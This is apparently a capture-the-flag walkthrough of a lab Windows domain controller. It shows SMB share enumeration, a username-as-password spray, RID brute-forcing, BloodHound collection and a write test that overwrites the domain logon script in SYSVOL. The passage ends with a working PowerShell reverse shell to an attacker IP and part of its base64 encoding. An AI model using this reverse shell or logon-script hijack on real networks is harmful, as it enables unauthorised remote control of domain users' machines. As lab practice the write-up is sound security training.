
Target :10.129.13.186

Date : 05/06/2026

Machine Information : "The User flag for this Box is located in a non-standard directory, C:."

```bash
>  echo "10.129.13.186 babytwo.htb" | sudo tee -a /etc/hosts
Please touch the FIDO authenticator.
10.129.13.186 babytwo.htb
>  nmap -Pn -sV -sC -O -p- --min-rate=3000 -T410.129.13.186
Nmap scan report for babytwo.htb (10.129.13.186)  
Host is up (0.11s latency).  
Not shown: 65517 filtered tcp ports (no-response)  
PORT      STATE SERVICE       VERSION  
53/tcp    open  domain        Simple DNS Plus  
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-06-05 14:04:35Z)  
135/tcp   open  msrpc         Microsoft Windows RPC  
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn  
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby2.vl, Site: Default-First-Site-Name)  
|_ssl-date: TLS randomness does not represent time  
| ssl-cert: Subject:    
| Subject Alternative Name: DNS:dc.baby2.vl, DNS:baby2.vl, DNS:BABY2  
| Not valid before: 2025-08-19T14:22:11  
|_Not valid after:  2105-08-19T14:22:11  
445/tcp   open  microsoft-ds?  
464/tcp   open  kpasswd5?  
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0  
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: baby2.vl, Site: Default-First-Site-Name)  
| ssl-cert: Subject:    
| Subject Alternative Name: DNS:dc.baby2.vl, DNS:baby2.vl, DNS:BABY2  
| Not valid before: 2025-08-19T14:22:11  
|_Not valid after:  2105-08-19T14:22:11  
|_ssl-date: TLS randomness does not represent time  
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby2.vl, Site: Default-First-Site-Name)  
|_ssl-date: TLS randomness does not represent time  
| ssl-cert: Subject:    
| Subject Alternative Name: DNS:dc.baby2.vl, DNS:baby2.vl, DNS:BABY2  
| Not valid before: 2025-08-19T14:22:11  
|_Not valid after:  2105-08-19T14:22:11  
3389/tcp  open  ms-wbt-server Microsoft Terminal Services  
|_ssl-date: 2026-06-05T14:06:10+00:00; 0s from scanner time.  
| ssl-cert: Subject: commonName=dc.baby2.vl  
| Not valid before: 2026-06-04T13:53:54  
|_Not valid after:  2026-12-04T13:53:54  
| rdp-ntlm-info:    
|   Target_Name: BABY2  
|   NetBIOS_Domain_Name: BABY2  
|   NetBIOS_Computer_Name: DC  
|   DNS_Domain_Name: baby2.vl  
|   DNS_Computer_Name: dc.baby2.vl  
|   DNS_Tree_Name: baby2.vl  
|   Product_Version: 10.0.20348  
|_  System_Time: 2026-06-05T14:05:31+00:00  
9389/tcp  open  mc-nmf        .NET Message Framing  
49664/tcp open  msrpc         Microsoft Windows RPC  
49667/tcp open  msrpc         Microsoft Windows RPC  
55068/tcp open  msrpc         Microsoft Windows RPC  
62275/tcp open  msrpc         Microsoft Windows RPC  
64275/tcp open  msrpc         Microsoft Windows RPC  
64278/tcp open  msrpc         Microsoft Windows RPC  
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port  
Device type: general purpose  
Running (JUST GUESSING): Microsoft Windows 2022|10|11|2012|2016 (89%)  
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_11 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016  
Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows 10 1703 or Windows 11 21H2 - 23H2 (85%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)  
No exact OS matches for host (test conditions non-ideal).  
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows  
  
Host script results:  
| smb2-security-mode:    
|   3.1.1:    
|_    Message signing enabled and required  
| smb2-time:    
|   date: 2026-06-05T14:05:32  
|_  start_date: N/A  
  
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 270.04 seconds
```

Active Directory box with `DNS:dc.baby2.vl, DNS:baby2.vl` that we'll add to our hosts with ports `389/tcp & 3268/tcp` (LDAP Active Directory), `445/tcp` (smb 3.1.1) `139/tcp` NetBIOS, 
`135/tcp` RPC `88/tcp` (Kerberos) and `53/tcp` (DNS) with a `ms-wbt-server` on  `3389/tcp`.

```bash
>  echo "10.129.13.186 babytwo.htb baby2.htb dc.baby2.vl baby2.vl" | sudo tee -a /etc/hosts  
Please touch the FIDO authenticator.  
10.129.13.186 babytwo.htb baby2.htb dc.baby2.vl baby2.vl
```

We'll start by enumerating shares as guest on SMB :

```bash
>  nxc smb10.129.13.186 -u guest -p '' --shares  
SMB        10.129.13.186  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:baby2.vl) (signing:True) (SMBv1:None) (Null Auth:True)  
SMB        10.129.13.186   445    DC               [+] baby2.vl\guest:    
SMB        10.129.13.186   445    DC               [*] Enumerated shares  
SMB        10.129.13.186   445    DC               Share           Permissions     Remark  
SMB        10.129.13.186   445    DC               -----           -----------     ------  
SMB        10.129.13.186   445    DC               ADMIN$                          Remote Admin  
SMB        10.129.13.186   445    DC               apps            READ               
SMB        10.129.13.186   445    DC               C$                              Default share  
SMB        10.129.13.186   445    DC               docs                               
SMB        10.129.13.186   445    DC               homes           READ,WRITE         
SMB        10.129.13.186   445    DC               IPC$            READ            Remote IPC  
SMB        10.129.13.186   445    DC               NETLOGON        READ            Logon server share    
SMB        10.129.13.186   445    DC               SYSVOL                          Logon server share
```

We have a `READ,WRITE` on `homes` and a `READ` on `NETLOGON` and `apps`.

```bash
>  smbclient //10.129.13.186/homes -U guest%  
Try "help" to get a list of possible commands.  
smb: \> ls  
 .                                   D        0  Fri Jun  5 16:12:45 2026  
 ..                                  D        0  Tue Aug 22 22:10:21 2023  
 Amelia.Griffiths                    D        0  Tue Aug 22 22:17:06 2023  
 Carl.Moore                          D        0  Tue Aug 22 22:17:06 2023  
 Harry.Shaw                          D        0  Tue Aug 22 22:17:06 2023  
 Joan.Jennings                       D        0  Tue Aug 22 22:17:06 2023  
 Joel.Hurst                          D        0  Tue Aug 22 22:17:06 2023  
 Kieran.Mitchell                     D        0  Tue Aug 22 22:17:06 2023  
 library                             D        0  Tue Aug 22 22:22:47 2023  
 Lynda.Bailey                        D        0  Tue Aug 22 22:17:06 2023  
 Mohammed.Harris                     D        0  Tue Aug 22 22:17:06 2023  
 Nicola.Lamb                         D        0  Tue Aug 22 22:17:06 2023  
 Ryan.Jenkins                        D        0  Tue Aug 22 22:17:06 2023  
  
               6126847 blocks of size 4096. 1277089 blocks available
```

So we already got a lot of users.

We'll spider_plus the files inside of the smb directory because that's a lot and build a users list.

```bash
>  nxc smb dc.baby2.vl -u 'guest' -p '' -M spider_plus -o DOWNLOAD_FLAG=True  
SMB        10.129.13.186   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:baby2.vl) (signing:True) (SMBv1:None) (Null Auth:True)  
SMB        10.129.13.186   445    DC               [+] baby2.vl\guest:    
SPIDER_PLUS10.129.13.186   445    DC               [*] Started module spidering_plus with the following options:  
SPIDER_PLUS10.129.13.186   445    DC               [*]  DOWNLOAD_FLAG: True  
SPIDER_PLUS10.129.13.186   445    DC               [*]     STATS_FLAG: True  
SPIDER_PLUS10.129.13.186   445    DC               [*] EXCLUDE_FILTER: ['print$', 'ipc$']  
SPIDER_PLUS10.129.13.186   445    DC               [*]   EXCLUDE_EXTS: ['ico', 'lnk']  
SPIDER_PLUS10.129.13.186   445    DC               [*]  MAX_FILE_SIZE: 50 KB  
SPIDER_PLUS10.129.13.186   445    DC               [*]  OUTPUT_FOLDER: /home/vagabond/.nxc/modules/nxc_spider_plus  
SMB        10.129.13.186   445    DC               [*] Enumerated shares  
SMB        10.129.13.186   445    DC               Share           Permissions     Remark  
SMB        10.129.13.186   445    DC               -----           -----------     ------  
SMB        10.129.13.186   445    DC               ADMIN$                          Remote Admin  
SMB        10.129.13.186   445    DC               apps            READ               
SMB        10.129.13.186   445    DC               C$                              Default share  
SMB        10.129.13.186   445    DC               docs                               
SMB        10.129.13.186   445    DC               homes           READ,WRITE         
SMB        10.129.13.186   445    DC               IPC$            READ            Remote IPC  
SMB        10.129.13.186   445    DC               NETLOGON        READ            Logon server share    
SMB        10.129.13.186   445    DC               SYSVOL                          Logon server share    
SPIDER_PLUS10.129.13.186   445    DC               [+] Saved share-file metadata to "/home/vagabond/.nxc/modules/nxc_spider_plus/10.129.13.186.json".  
SPIDER_PLUS10.129.13.186   445    DC               [*] SMB Shares:           8 (ADMIN$, apps, C$, docs, homes, IPC$, NETLOGON, SYSVOL)  
SPIDER_PLUS10.129.13.186   445    DC               [*] SMB Readable Shares:  4 (apps, homes, IPC$, NETLOGON)  
SPIDER_PLUS10.129.13.186   445    DC               [*] SMB Writable Shares:  1 (homes)  
SPIDER_PLUS10.129.13.186   445    DC               [*] SMB Filtered Shares:  1  
SPIDER_PLUS10.129.13.186   445    DC               [*] Total folders found:  12  
SPIDER_PLUS10.129.13.186   445    DC               [*] Total files found:    3  
SPIDER_PLUS10.129.13.186   445    DC               [*] Files filtered:       1  
SPIDER_PLUS10.129.13.186   445    DC               [*] File size average:    966.67 B  
SPIDER_PLUS10.129.13.186   445    DC               [*] File size min:        108 B  
SPIDER_PLUS10.129.13.186   445    DC               [*] File size max:        1.76 KB  
SPIDER_PLUS10.129.13.186   445    DC               [*] File unique exts:     2 (vbs, lnk)  
SPIDER_PLUS10.129.13.186   445    DC               [*] Downloads successful: 2  
SPIDER_PLUS10.129.13.186   445    DC               [+] All files processed successfully.
```

Only two downloaded files we'll check quickly for anything interesting :

```bash
 rg -i 'password|passwd|pwd|secret|User Id|connectionstring|BEGIN OPENSSH|\.rdp|gpp|Groups\.xml|cpassword|auto.?logon|DefaultPassword' /home/vagabond/.nxc/modules/nxc_spider_plus/10.129.13.186.json | head -40  
  
>  rg -i '\.(txt|xml|ini|config|bat|ps1|sql|json|yml|yaml|rdp|kdbx)$' /home/vagabond/.nxc/modules/nxc_spider_plus/10.129.13.186.json | head -40
```

And we got nothing, so we'll proceed with exploring the SMB shares and creating the users list :

```bash
>  sudo nano users.txt  
>  cat users.txt  
Amelia.Griffiths  
Carl.Moore  
Harry.Shaw     
Joan.Jennings  
Joel.Hurst  
Kieran.Mitchell  
Lynda.Bailey  
Mohammed.Harris  
Nicola.Lamb  
Ryan.Jenkins
```

Then we'll explore the SMB shares :

```bash
>  smbclient //10.129.13.186/apps -U guest%  
Try "help" to get a list of possible commands.  
smb: \> ls  
 .                                   D        0  Thu Sep  7 21:12:59 2023  
 ..                                  D        0  Tue Aug 22 22:10:21 2023  
 dev                                 D        0  Thu Sep  7 21:13:50 2023  
  
               6126847 blocks of size 4096. 1960306 blocks available  
smb: \> cd dev  
smb: \dev\> ls  
 .                                   D        0  Thu Sep  7 21:13:50 2023  
 ..                                  D        0  Thu Sep  7 21:12:59 2023  
 CHANGELOG                           A      108  Thu Sep  7 21:16:15 2023  
 login.vbs.lnk                       A     1800  Thu Sep  7 21:13:23 2023  
  
               6126847 blocks of size 4096. 1960306 blocks available  
smb: \dev\> get CHANGELOG  
getting file \dev\CHANGELOG of size 108 as CHANGELOG (0.4 KiloBytes/sec) (average 0.4 KiloBytes/sec)  
smb: \dev\> get login.vbs.lnk  
getting file \dev\login.vbs.lnk of size 1800 as login.vbs.lnk (4.9 KiloBytes/sec) (average 2.9 KiloBytes/sec)
```

```bash
>  cat CHANGELOG  
[0.2]  
  
- Added automated drive mapping  
  
[0.1]  
  
- Rolled out initial version of the domain logon script%
```

And we need to decrypt `login.vbs.lnk` to get something out of it.

```bash
>  /home/vagabond/.local/bin/lnkparse login.vbs.lnk  
Windows Shortcut Information:  
  Guid: 00021401-0000-0000-C000-000000000046  
  Link flags: HasTargetIDList | HasLinkInfo | HasRelativePath | HasWorkingDir | IsUnicode | EnableTargetMetadata - (524443)  
  File flags: FILE_ATTRIBUTE_ARCHIVE - (32)  
  Creation time: 2023-08-22 19:28:18.552829+00:00  
  Accessed time: 2023-09-02 14:55:51.994608+00:00  
  Modified time: 2023-09-02 14:55:51.994608+00:00  
  File size: 992  
  Icon index: 0  
  Windowstyle: SW_SHOWNORMAL  
  Hotkey: UNSET - UNSET {0x0000}  
  
  SIZE: 1800  
  
  TARGET:  
     Items:  
     -  Root Folder:  
           Sort index: My Computer  
           Sort index value: 80  
           Guid: 20D04FE0-3AEA-1069-A2D8-08002B30309D  
     -  Volume Item:  
           Flags: '0xf'  
           Volume name: C:\  
     -  File entry:  
           Flags: Is directory  
           File size: 0  
           File attribute flags: 16  
           Primary name: Windows  
     -  File entry:  
           Flags: Is directory  
           File size: 0  
           File attribute flags: 16  
           Primary name: SYSVOL  
     -  File entry:  
           Flags: Is directory  
           File size: 0  
           File attribute flags: 16  
           Primary name: sysvol  
     -  File entry:  
           Flags: Is directory  
           File size: 0  
           File attribute flags: 1040  
           Primary name: baby2.vl  
     -  File entry:  
           Flags: Is directory  
           File size: 0  
           File attribute flags: 16  
           Primary name: scripts  
     -  File entry:  
           Flags: Is file  
           File size: 992  
           File attribute flags: 32  
           Primary name: login.vbs  
  
  LINK INFO:  
     Link info flags: 3  
     Local base path: C:\Windows\SYSVOL\sysvol\baby2.vl\scripts\  
     Common path suffix: login.vbs  
     Location info:  
        Drive type: DRIVE_FIXED  
        Drive serial number: '0xe6f32485'  
        Volume label: ''  
     Location: Local  
  
  DATA:  
     Relative path: ..\..\..\Windows\SYSVOL\sysvol\baby2.vl\scripts\login.vbs  
     Working directory: C:\Windows\SYSVOL\sysvol\baby2.vl\scripts  
  
  EXTRA:  
     SPECIAL FOLDER LOCATION BLOCK:  
        Size: 16  
        Special folder id: 36  
        Offset: 131  
     KNOWN FOLDER LOCATION BLOCK:  
        Size: 28  
        Known folder id: F38BF404-1D43-42F2-9305-67DE0B28FC23  
        Offset: 131  
     DISTRIBUTED LINK TRACKER BLOCK:  
        Size: 96  
        Length: 88  
        Version: 0  
        Machine identifier: dc  
        Droid volume identifier: F73129F6-BEED-429A-88BA-9573971C9D61  
        Droid file identifier: A6644D7E-411F-11EE-B012-000C29AF9E25  
        Birth droid volume identifier: F73129F6-BEED-429A-88BA-9573971C9D61  
        Birth droid file identifier: A6644D7E-411F-11EE-B012-000C29AF9E25  
     METADATA PROPERTIES BLOCK:  
        Size: 677  
        Property store:  
        -  Storage size: 133  
           Version: '0x53505331'  
           Format id: DABD30ED-0043-4789-A7F8-D013A4736622  
           Serialized property values:  
           -  Value size: 105  
              Id: 100  
              Value: scripts (C:\Windows\SYSVOL\sysvol\baby2.vl)  
              Value type: VT_LPWSTR  
        -  Storage size: 137  
           Version: '0x53505331'  
           Format id: 46588AE2-4CBC-4338-BBFC-139326986DCE  
           Serialized property values:  
           -  Value size: 109  
              Id: 4  
              Value: S-1-5-21-213243958-1766259620-4276976267-500  
              Value type: VT_LPWSTR  
        -  Storage size: 189  
           Version: '0x53505331'  
           Format id: B725F130-47EF-101A-A5F1-02608C9EEBAC  
           Serialized property values:  
           -  Value size: 37  
              Id: 10  
              Value: login.vbs  
              Value type: VT_LPWSTR  
           -  Value size: 21  
              Id: 15  
              Value: null  
              Value type: VT_FILETIME  
           -  Value size: 21  
              Id: 12  
              Value: null  
              Value type: VT_UI8  
           -  Value size: 61  
              Id: 4  
              Value: VBScript Script File  
              Value type: VT_LPWSTR  
           -  Value size: 21  
              Id: 14  
              Value: null  
              Value type: VT_FILETIME  
        -  Storage size: 149  
           Version: '0x53505331'  
           Format id: 28636AA6-953D-11D2-B5D6-00C04FD918D0  
           Serialized property values:  
           -  Value size: 121  
              Id: 30  
              Value: C:\Windows\SYSVOL\sysvol\baby2.vl\scripts\login.vbs  
              Value type: VT_LPWSTR  
        -  Storage size: 57  
           Version: '0x53505331'  
           Format id: 446D16B1-8DAD-4870-A748-402EA43D788C  
           Serialized property values:  
           -  Value size: 29  
              Id: 104  
              Value: null  
              Value type: VT_CLSID
```

So we got a shortcut for `C:\Windows\SYSVOL\sysvol\baby2.vl\scripts\login.vbs` which we might have access to :

```bash
>  smbclient //10.129.13.186/SYSVOL -U guest%
smb: \> cd /baby2.vl  
cd \baby2.vl\: NT_STATUS_ACCESS_DENIED
```

And it seems the path is denied as guest.

So we'll do a spray see if we get a `user:user` as correct login :

```bash
>  nxc smb dc.baby2.vl -u users.txt -p users.txt --no-bruteforce --continue-on-success  
  
SMB        10.129.13.186   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:baby2.vl) (signing:True) (SMBv1:None) (Null Auth:True)  
SMB        10.129.13.186   445    DC               [-] baby2.vl\Amelia.Griffiths:Amelia.Griffiths STATUS_LOGON_FAILURE    
SMB        10.129.13.186   445    DC               [+] baby2.vl\Carl.Moore:Carl.Moore    
SMB        10.129.13.186   445    DC               [-] baby2.vl\Harry.Shaw:Harry.Shaw STATUS_LOGON_FAILURE    
SMB        10.129.13.186   445    DC               [-] baby2.vl\Joan.Jennings:Joan.Jennings STATUS_LOGON_FAILURE    
SMB        10.129.13.186   445    DC               [-] baby2.vl\Joel.Hurst:Joel.Hurst STATUS_LOGON_FAILURE    
SMB        10.129.13.186   445    DC               [-] baby2.vl\Kieran.Mitchell:Kieran.Mitchell STATUS_LOGON_FAILURE    
SMB        10.129.13.186   445    DC               [-] baby2.vl\Lynda.Bailey:Lynda.Bailey STATUS_LOGON_FAILURE    
SMB        10.129.13.186   445    DC               [-] baby2.vl\Mohammed.Harris:Mohammed.Harris STATUS_LOGON_FAILURE    
SMB        10.129.13.186   445    DC               [-] baby2.vl\Nicola.Lamb:Nicola.Lamb STATUS_LOGON_FAILURE    
SMB        10.129.13.186   445    DC               [-] baby2.vl\Ryan.Jenkins:Ryan.Jenkins STATUS_LOGON_FAILURE
```

And we got it, `[+] baby2.vl\Carl.Moore:Carl.Moore`.

So we'll try `nxc winrm` and `nxc smb` on it and try to access the SYSVOL login `\baby2.vl\scripts\login.vbs` with this user.

```bash
>  nxc winrm10.129.13.186 -u Carl.Moore -p 'Carl.Moore'  
WINRM      10.129.13.186   5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:baby2.vl)    
WINRM      10.129.13.186   5985   DC               [-] baby2.vl\Carl.Moore:Carl.Moore

>  nxc smb10.129.13.186 -u Carl.Moore -p 'Carl.Moore' --shares  
SMB        10.129.13.186   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:baby2.vl) (signing:True) (SMBv1:None) (Null Auth:True)  
SMB        10.129.13.186   445    DC               [+] baby2.vl\Carl.Moore:Carl.Moore    
SMB        10.129.13.186   445    DC               [*] Enumerated shares  
SMB        10.129.13.186   445    DC               Share           Permissions     Remark  
SMB        10.129.13.186   445    DC               -----           -----------     ------  
SMB        10.129.13.186   445    DC               ADMIN$                          Remote Admin  
SMB        10.129.13.186   445    DC               apps            READ,WRITE         
SMB        10.129.13.186   445    DC               C$                              Default share  
SMB        10.129.13.186   445    DC               docs            READ,WRITE         
SMB        10.129.13.186   445    DC               homes           READ,WRITE         
SMB        10.129.13.186   445    DC               IPC$            READ            Remote IPC  
SMB        10.129.13.186   445    DC               NETLOGON        READ            Logon server share    
SMB        10.129.13.186   445    DC               SYSVOL          READ            Logon server share
```

So this time we have `READ,WRITE` on `apps` and `docs` as well as `READ` on SYSVOL which makes me think we can get to that shortcut we found earlier.

```bash
>  smbclient //10.129.13.186/SYSVOL -U Carl.Moore%Carl.Moore  
Try "help" to get a list of possible commands.  
smb: \> ls  
 .                                   D        0  Tue Aug 22 19:37:36 2023  
 ..                                  D        0  Tue Aug 22 19:37:36 2023  
 baby2.vl                           Dr        0  Tue Aug 22 19:37:36 2023  
  
               6126847 blocks of size 4096. 1960110 blocks available  
smb: \> cd baby2.vl/scripts  
smb: \baby2.vl\scripts\> ls  
 .                                   D        0  Mon Aug 25 10:30:39 2025  
 ..                                  D        0  Tue Aug 22 19:43:55 2023  
 login.vbs                           A      992  Sat Sep  2 16:55:51 2023  
  
               6126847 blocks of size 4096. 1960110 blocks available  
smb: \baby2.vl\scripts\> get login.vbs  
getting file \baby2.vl\scripts\login.vbs of size 992 as login.vbs (2.7 KiloBytes/sec) (average 2.7 KiloBytes/sec)
```

And we got `login.vbs`. No luck on `winrm`.

```bash
>  cat login.vbs  
Sub MapNetworkShare(sharePath, driveLetter)  
   Dim objNetwork  
   Set objNetwork = CreateObject("WScript.Network")       
    
    Check if the drive is already mapped  
   Dim mappedDrives  
   Set mappedDrives = objNetwork.EnumNetworkDrives  
   Dim isMapped  
   isMapped = False  
   For i = 0 To mappedDrives.Count - 1 Step 2  
       If UCase(mappedDrives.Item(i)) = UCase(driveLetter & ":") Then  
           isMapped = True  
           Exit For  
       End If  
   Next  
      
   If isMapped Then  
       objNetwork.RemoveNetworkDrive driveLetter & ":", True, True  
   End If  
      
   objNetwork.MapNetworkDrive driveLetter & ":", sharePath  
      
   If Err.Number = 0 Then  
       WScript.Echo "Mapped " & driveLetter & ": to " & sharePath  
   Else  
       WScript.Echo "Failed to map " & driveLetter & ": " & Err.Description  
   End If  
      
   Set objNetwork = Nothing  
End Sub  
  
MapNetworkShare "\\dc.baby2.vl\apps", "V"  
MapNetworkShare "\\dc.baby2.vl\docs", "L"%

>  smbclient //10.129.13.186/docs -U Carl.Moore%Carl.Moore  
Try "help" to get a list of possible commands.  
smb: \> ls  
 .                                   D        0  Fri Jun  5 16:47:16 2026  
 ..                                  D        0  Tue Aug 22 22:10:21 2023  
  
               6126847 blocks of size 4096. 1960047 blocks available
```

And that's all we seem to get.

We'll try a new spray, this time with all the `SidTypeUsers` :

```
>  nxc smb dc.baby2.vl -u guest -p '' --rid-brute | rg SidTypeUser | cut -d'\' -f2 | cut -d' ' -f1 | sort -u | tee users-rid.txt
>  nxc smb dc.baby2.vl -u users-rid.txt -p users-rid.txt --no-bruteforce --continue-on-success  
  
SMB        10.129.13.186   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:baby2.vl) (signing:True) (SMBv1:None) (Null Auth:True)  
SMB        10.129.13.186   445    DC               [-] baby2.vl\Administrator:Administrator STATUS_LOGON_FAILURE    
SMB        10.129.13.186   445    DC               [-] baby2.vl\Amelia.Griffiths:Amelia.Griffiths STATUS_LOGON_FAILURE    
SMB        10.129.13.186   445    DC               [+] baby2.vl\Carl.Moore:Carl.Moore    
SMB        10.129.13.186   445    DC               [-] baby2.vl\DC$:DC$ STATUS_LOGON_FAILURE    
SMB        10.129.13.186   445    DC               [-] baby2.vl\gpoadm:gpoadm STATUS_LOGON_FAILURE    
SMB        10.129.13.186   445    DC               [-] baby2.vl\Guest:Guest STATUS_LOGON_FAILURE    
SMB        10.129.13.186   445    DC               [-] baby2.vl\Harry.Shaw:Harry.Shaw STATUS_LOGON_FAILURE    
SMB        10.129.13.186   445    DC               [-] baby2.vl\Joan.Jennings:Joan.Jennings STATUS_LOGON_FAILURE    
SMB        10.129.13.186   445    DC               [-] baby2.vl\Joel.Hurst:Joel.Hurst STATUS_LOGON_FAILURE    
SMB        10.129.13.186   445    DC               [-] baby2.vl\Kieran.Mitchell:Kieran.Mitchell STATUS_LOGON_FAILURE    
SMB        10.129.13.186   445    DC               [-] baby2.vl\krbtgt:krbtgt STATUS_LOGON_FAILURE    
SMB        10.129.13.186   445    DC               [+] baby2.vl\library:library    
SMB        10.129.13.186   445    DC               [-] baby2.vl\Lynda.Bailey:Lynda.Bailey STATUS_LOGON_FAILURE    
SMB        10.129.13.186   445    DC               [-] baby2.vl\Mohammed.Harris:Mohammed.Harris STATUS_LOGON_FAILURE    
SMB        10.129.13.186   445    DC               [-] baby2.vl\Nicola.Lamb:Nicola.Lamb STATUS_LOGON_FAILURE    
SMB        10.129.13.186   445    DC               [-] baby2.vl\Ryan.Jenkins:Ryan.Jenkins STATUS_LOGON_FAILURE
```

And we missed the second hit apparently : `library:library`.

We'll run netexec on it as well :

```bash
>  nxc smb10.129.13.186 -u library -p 'library' --shares  
SMB        10.129.13.186   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:baby2.vl) (signing:True) (SMBv1:None) (Null Auth:True)  
SMB        10.129.13.186   445    DC               [+] baby2.vl\library:library    
SMB        10.129.13.186   445    DC               [*] Enumerated shares  
SMB        10.129.13.186   445    DC               Share           Permissions     Remark  
SMB        10.129.13.186   445    DC               -----           -----------     ------  
SMB        10.129.13.186   445    DC               ADMIN$                          Remote Admin  
SMB        10.129.13.186   445    DC               apps            READ,WRITE         
SMB        10.129.13.186   445    DC               C$                              Default share  
SMB        10.129.13.186   445    DC               docs            READ,WRITE         
SMB        10.129.13.186   445    DC               homes           READ,WRITE         
SMB        10.129.13.186   445    DC               IPC$            READ            Remote IPC  
SMB        10.129.13.186   445    DC               NETLOGON        READ            Logon server share    
SMB        10.129.13.186   445    DC               SYSVOL          READ            Logon server share    
>  nxc winrm10.129.13.186 -u library -p 'library'  
WINRM      10.129.13.186   5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:baby2.vl)    
WINRM      10.129.13.186   5985   DC               [-] baby2.vl\library:library
```

And nothing new.

We'll try to write a file into SYSVOL that pretends to be `login.vbs` :

```bash
>  cp login.vbs login.vbs.bak  
echo 'test write proof' > login-test.vbs  
smbclient //10.129.13.186/SYSVOL -U 'Carl.Moore%Carl.Moore' -c 'cd baby2.vl/scripts; put login-test.vbs login.vbs; ls'  
  
putting file login-test.vbs as \baby2.vl\scripts\login.vbs (0.1 kB/s) (average 0.1 kB/s)  
 .                                   D        0  Mon Aug 25 10:30:39 2025  
 ..                                  D        0  Tue Aug 22 19:43:55 2023  
 login.vbs                           A       17  Fri Jun  5 17:07:03 2026  
  
               6126847 blocks of size 4096. 1960951 blocks available
```

And it worked.

Time to get `bloodhound` running so we can try to get to other users.

```bash
>  bloodhound-python -d baby2.vl -c All -u library -p 'library' -ns10.129.13.186 --zip  
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)  
INFO: Found AD domain: baby2.vl  
INFO: Getting TGT for user  
INFO: Connecting to LDAP server: dc.baby2.vl  
INFO: Testing resolved hostname connectivity dead:beef::898b:764c:b388:b97e  
INFO: Trying LDAP connection to dead:beef::898b:764c:b388:b97e  
INFO: Testing resolved hostname connectivity dead:beef::19d  
INFO: Trying LDAP connection to dead:beef::19d  
INFO: Found 1 domains  
INFO: Found 1 domains in the forest  
INFO: Found 1 computers  
INFO: Connecting to LDAP server: dc.baby2.vl  
INFO: Testing resolved hostname connectivity dead:beef::898b:764c:b388:b97e  
INFO: Trying LDAP connection to dead:beef::898b:764c:b388:b97e  
INFO: Testing resolved hostname connectivity dead:beef::19d  
INFO: Trying LDAP connection to dead:beef::19d  
INFO: Found 16 users  
INFO: Found 54 groups  
INFO: Found 2 gpos  
INFO: Found 3 ous  
INFO: Found 19 containers  
INFO: Found 0 trusts  
INFO: Starting computer enumeration with 10 workers  
INFO: Querying computer: dc.baby2.vl  
INFO: Done in 00M 33S  
INFO: Compressing output into 20260605171144_bloodhound.zip
```

We start `bloodhound` but it seems neither `library` nor `Carl.Moore` have any Outbound Object Control.

We let bloodhound alone for now, and put back login.vbs where it was :

```bash
>  smbclient //10.129.13.186/SYSVOL -U 'Carl.Moore%Carl.Moore' -c 'cd baby2.vl/scripts; put login.vbs.bak login.vbs; ls'  
  
putting file login.vbs.bak as \baby2.vl\scripts\login.vbs (6.1 kB/s) (average 6.1 kB/s)  
 .                                   D        0  Mon Aug 25 10:30:39 2025  
 ..                                  D        0  Tue Aug 22 19:43:55 2023  
 login.vbs                           A      992  Fri Jun  5 17:17:34 2026  
  
               6126847 blocks of size 4096. 1958018 blocks available
```

So we create a payload to mimick `login.vbs` to get a shell :

```bash
>  cat > /tmp/revshell.ps1 << 'EOF'  
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.228',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object  
-TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendbac  
k2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()  
EOF  
  
iconv -f ASCII -t UTF-16LE /tmp/revshell.ps1 | base64 -w0  
JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA0AC4AMgAyADgAJwAsADQANAAzACkAOwAkAHMAdAByAGUAYQBtACAAPQ  
AgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABi  
AHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAE  
